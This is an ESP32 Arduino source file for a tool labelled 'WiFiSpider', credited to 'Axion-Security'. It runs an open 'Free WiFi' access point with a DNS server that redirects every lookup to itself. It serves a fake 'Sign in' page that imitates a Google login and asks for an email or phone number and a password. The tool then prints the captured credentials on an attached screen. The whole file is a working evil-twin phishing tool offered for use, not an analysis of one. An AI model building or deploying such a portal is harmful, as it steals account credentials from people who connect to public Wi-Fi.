#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <map>
#include <string>
#include <bb_spi_lcd.h>

BB_SPI_LCD lcd;

DNSServer dnsServer;
WebServer webServer(80);
IPAddress apGateway(192, 168, 1, 1);

String SSID = "Free WiFi";
String htmlPage = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sign in</title>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                align-items: center;
                justify-content: center;
                background-color: #FFFFFF;
                margin: 0;
                padding: 0;
                height: 100vh;
            }
            .container {
                max-width: 400px;
                padding: 20px;
                border: 1px solid #ccc;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            }
            .container h1 {
                text-align: center;
                margin-bottom: 20px;
            }
            .input-field {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            .submit-btn {
                width: 100%;
                padding: 10px;
                background-color: #4285f4;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
            .submit-btn:hover {
                background-color: #357ae8;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Sign in</h1>
            <form action="/post" method="post">
                <input type="text" name="email" class="input-field" placeholder="Email or phone" required>
                <input type="password" name="password" class="input-field" placeholder="Password" required>
                <input type="text" name="optionalField" class="input-field" placeholder="Optional Field">
                <button type="submit" class="submit-btn">Next</button>
            </form>
        </div>
    </body>
    </html>
    )rawliteral";

void setup() {
  Serial.begin(115200);
  lcd.begin(DISPLAY_CYD_22C);
  lcd.fillScreen(TFT_BLACK);
  lcd.setTextColor(TFT_GREEN, TFT_BLACK);
  lcd.setRotation(180);
  lcd.setFont(FONT_8x8);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
  bool apStarted = WiFi.softAP(SSID.c_str());

  if (apStarted) {
    lcd.println("[WiFiSpider]: Developed By Axion-Security");
    lcd.println("AP Started!");
  } else {
    lcd.println("Failed to start AP!");
    while (1) delay(100);
  }

  webServer.on("/", [] { webServer.send(200, "text/html", htmlPage); });
  webServer.on("/post", handleLogin);
  webServer.onNotFound([] { webServer.send(200, "text/html", htmlPage); });
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.begin();
}

void handleLogin() {
  if (webServer.args() > 0) {
    processCredentials();
  }
  webServer.send(200, "text/html", "<h1>Credentials received</h1>");
}

void processCredentials() {
  lcd.println("");
  std::map<std::string, std::string> credentials;

  for (int i = 0; i < webServer.args(); ++i) {
    std::string key = webServer.argName(i).c_str();
    std::string value = webServer.arg(i).c_str();
    credentials[key] = value;
  }

  for (const auto &pair : credentials) {
    lcd.println((pair.first + " = " + pair.second).c_str());
    }
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
